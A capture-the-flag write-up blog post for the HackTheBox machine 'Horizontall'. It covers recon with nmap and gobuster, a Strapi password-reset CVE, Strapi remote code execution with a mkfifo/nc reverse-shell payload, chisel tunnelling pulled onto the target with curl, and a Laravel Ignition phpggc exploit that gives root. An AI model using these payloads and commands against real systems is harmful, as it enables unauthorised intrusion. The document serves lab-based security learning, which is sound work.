---
layout: post
name: horizontall
title:  "HackTheBox: Horizontall"
date:   2021-11-05 11:00:00 +1000
categories: red-team
tags: linux gobuster chisel laravel
excerpt_separator: <!--more-->
---

**Horizontall** is a Linux-based machine authored by *wail99*, with an average rating of 4.2 stars.

<!--more-->

<p align="center"><img src="/assets/images/horizontall/main.png" /></p>

### // Recon
```
nmap -A -p- 10.10.11.105
Starting Nmap 7.92 ( https://nmap.org ) at 2021-10-29 13:18 AEST
Nmap scan report for 10.10.11.105
Host is up (0.025s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Did not follow redirect to http://horizontall.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 334.65 seconds
```

Nmap provides us with a couple of software version numbers, neither of which turns up much in terms of known vulnerabilities. The site is similarly barren in terms of links & features, but there is a minified javascript file located at `/js/app.c68eb462.js` that reveals an additional subdomain:
```
...
methods: {
    getReviews: function () {
        var t = this;
        r.a.get("http://api-prod.horizontall.htb/reviews").then((function (s) {
            return t.reviews = s.data
        }))
    }
}
...
```

We could have also discovered this subdomain by using [gobuster](https://github.com/OJ/gobuster) and the `best-dns-wordlist.txt` from the excellent [Assetnote Wordlists](https://wordlists.assetnote.io/) repository:
```
gobuster dns -d horizontall.htb -w best-dns-wordlist.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:     horizontall.htb
[+] Threads:    10
[+] Timeout:    1s
[+] Wordlist:   best-dns-wordlist.txt
===============================================================
2021/11/03 10:05:45 Starting gobuster in DNS enumeration mode
===============================================================
Found: api-prod.horizontall.htb
```

With only these two hostnames to go on, we can now re-run gobuster in directory/file enumeration mode, to look for hidden/unlinked content. The list I most often begin discovery with is `directory-list-2.3-medium.txt` from the popular [SecLists](https://github.com/danielmiessler/SecLists/) repo, from which I can then move on to larger or more targeted wordlists as needed:
```
gobuster dir -u http://horizontall.htb/ -w directory-list-2.3-medium.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://horizontall.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/11/03 10:15:00 Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 301) [Size: 194] [--> http://horizontall.htb/img/]
/css                  (Status: 301) [Size: 194] [--> http://horizontall.htb/css/]
/js                   (Status: 301) [Size: 194] [--> http://horizontall.htb/js/]
```

These directories were already identifed when manually browsing the site, so let's move onto the `api-prod` hostname:
```
gobuster dir -u http://api-prod.horizontall.htb/ -w directory-list-2.3-medium.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://api-prod.horizontall.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/11/03 10:15:17 Starting gobuster in directory enumeration mode
===============================================================
/reviews              (Status: 200) [Size: 507]
/users                (Status: 403) [Size: 60]
/admin                (Status: 200) [Size: 854]
...
```

Both `/reviews` and `/users` are REST endpoints of the api, returning structured data. `/admin` on the other hand redirects us to a _strapi_ login page:

<p align="center"><img src="/assets/images/horizontall/1.png" /></p>

### // Initial Foothold
[Strapi](https://strapi.io/) is an open-source, Node.js Headless CMS. The project's website offers a lot of documentation about its various features and components. A search for `strapi vulnerabilities` reveals a number of [disclosed CVEs](https://www.cvedetails.com/vulnerability-list/vendor_id-22287/product_id-75293/Strapi-Strapi.html) over the past two years:

- [CVE-2019-19609](https://www.cvedetails.com/cve/CVE-2019-19609/) is immediately interesting, as it provides remote code execution. Unfortunately further reading reveals that an authenticated token is required first, but it's helpful to know this exists
- [CVE-2019-18818](https://www.cvedetails.com/cve/CVE-2019-18818/) is an exploit that allows for an unauthenticated password reset, provided the version is vulnerable. The [exploit code](https://packetstormsecurity.com/files/163939/Strapi-3.0.0-beta-Authentication-Bypass.html) written in python shows that we can check the version by browsing to `/admin/strapiVersion`, which reveals that our target host is running `3.0.0-beta.17.4` and is indeed vulnerable

Three variables need to be set in the script before execution:
1. userEmail (unknown at this stage)
2. strapiUrl (identified as http://api-prod.horizontall.htb)
3. newPassword (whatever we want)

We don't have any known values for `userEmail` at this stage. We could dig into the login page's behaviour via Burp Suite, to see if user enumeration is possible - some web applications will return a slightly different error message on a failed login attempt, depending on whether the user exists or not. But before we spend time on that, it's a good idea to test at least a few obvious values - administrator, admin etc:
```
$ python pass_reset.py
[*] strapi version: 3.0.0-beta.17.4
[*] Password reset for user: administrator
[*] Setting new password
[+] New password 's3cret' set for user administrator
```

The "New password..." output is actually returned for any value of `userName` regardless of whether it's valid, meaning we don't know if we've succeeded until we try to login. Luckily the common `admin` value is valid in this case, and allows us to login to the portal:

<p align="center"><img src="/assets/images/horizontall/2.png" /></p>

With admin access to the strapi control panel, we can return our attention to the rce CVE mentioned earlier. The accompanying [writeup](https://bittherapy.net/post/strapi-framework-remote-code-execution/) does an excellent job of explaining why the vulnerability exists, which basically comes down to npm execution of unsanitised user input via `execa`. There is also a ready-made [exploit script](https://packetstormsecurity.com/files/163940/Strapi-3.0.0-beta.17.7-Remote-Code-Execution.html) available, which I combined with the reverse-shell command from the write-up to gain access to the host:
```
# establish listener on local machine:
nc -lnvp 4544

# modify line 57 of the exploit script to connect out to local machine, instead of executing a single command
"plugin": "documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f)" % (lhost, lport)
```

When the script is run, the connection is created:
```
Connection from 10.10.11.105:53256
```

We can then upgrade this shell to a full tty, using one of [several methods](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) for stability and to improve the shell experience (tab completion, job control etc). [penelope](https://github.com/brightio/penelope) is another option that handles the entire listener setup and upgrading process, which makes things even simpler.

Now that we have shell access as the _strapi_ user, we can browse around the filesystem and soon discover the User-Own flag:
```
$ ls /home
developer
$ ls -l /home/developer
-rw-rw----  1 developer developer 58460 May 26 11:59 composer-setup.php
drwx------ 12 developer developer  4096 May 26 12:21 myproject
-r--r--r--  1 developer developer    33 Nov  3 16:23 user.txt
$ cat /home/developer/user.txt
7*******************************
```

### // Privilege Escalation
With the foothold achieved, we can move on to enumeration to look for methods of privilege escalation. There are some [excellent guides](https://notchxor.github.io/oscp-notes/5-linux-privesc/4-2-linux-privesc/) on what to check for here, as well as automated tools such as [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) that can save a lot of time. `netstat` reveals a few additional services worth checking out:
```
$ netstat -lntup
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN      1634/node /usr/bin/
tcp6       0      0 :::80                   :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
```

Some of these are dead-ends or red herrings, for example:
- mysql is running on port `3306`, and if we dig through the files in `/opt/strapi` we can find a password for the `developer` user. There isn't anything useful in the available databases though, and trying to achieve privileged file access via `load_file()` was not possible
- the node server listening on port `1337` is just another means to access the strapi website, which we can already get to via port `80`

The service on port `8000` does give us something though. We can retrieve the default page via `curl http://localhost:8000` and learn that it is a laravel / php website. Trying to read raw html code is pretty painful, but we're unable to browse to the service from our local machine since it's only running on localhost. Normally we could port-forward over ssh, but this isn't available because we don't have a full login for our `strapi` user. This is where [chisel](https://github.com/jpillora/chisel) comes in - it provides a means of tunneling connections over HTTP, which will allow us to achieve the same result. The setup requires us to have the binary on both server (our local machine) and client (the target), which in this case was achieved using a [python http-server](https://docs.python.org/3/library/http.server.html):

```
# from the directory containing the binary on the server:
python -m http.server
Serving HTTP on :: port 8000 (http://[::]:8000/) ...

# from the client:
$ curl http://10.10.14.85:8000/chisel -o /tmp/chisel
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 10.9M  100 10.9M    0     0  11.6M      0 --:--:-- --:--:-- --:--:-- 11.6M
```

As per the docs, we start the server-side listener:
```
./chisel server -p 7777 --reverse
```

and then establish a tunnel from the client, from `8000` on the localhost to `7778` on the server:
```
/tmp/chisel client 10.10.14.85:7777 R:7778:127.0.0.1:8000
```

and we are now able to browse to the site:
<p align="center"><img src="/assets/images/horizontall/3.png" /></p>

Straight away we can see that `Laravel v8 (PHP 7.4.18)` is being used. Running `gobuster` against the site as we did initially reveals a `/profiles` page:

<p align="center"><img src="/assets/images/horizontall/4.png" /></p>

CMS frameworks running in debug mode tend to output a lot of sensitive information, which is why they should be disabled when running in production. In this case, the framework goes even further, and offers suggestions on how to fix errors found in the code. Combining code execution with user input is often dangerous, and in this case we don't have to search too far for an [explanation of why](https://www.ambionics.io/blog/laravel-debug-rce). The Ambionics blog does an excellent job of detailing the exploit, and a ready-made [PoC is available on Github](https://github.com/ambionics/laravel-exploits). If we generate a payload to run the `id` command, the results are compelling:
```
$ php -d'phar.readonly=0' ./phpggc --phar phar -o /tmp/exploit.phar --fast-destruct monolog/rce1 system id
$ python laravel-ignition-rce.py http://localhost:7778 /tmp/exploit.phar
+ Log file: /home/developer/myproject/storage/logs/laravel.log
+ Logs cleared
+ Successfully converted to PHAR !
+ Phar deserialized
--------------------------
uid=0(root) gid=0(root) groups=0(root)
--------------------------
+ Logs cleared
```

The service is running as `root`. All we need to do now is adjust our payload accordingly, and we can access the `/root` folder for the System-Own key:
```
$ php -d'phar.readonly=0' ./phpggc --phar phar -o /tmp/exploit.phar --fast-destruct monolog/rce1 system cat\ \/root\/root.txt
$ python laravel-ignition-rce.py http://localhost:7778 /tmp/exploit.phar
+ Log file: /home/developer/myproject/storage/logs/laravel.log
+ Logs cleared
+ Successfully converted to PHAR !
+ Phar deserialized
--------------------------
5*******************************
--------------------------
+ Logs cleared
```

<p align="center"><img src="/assets/images/horizontall/5.png" /></p>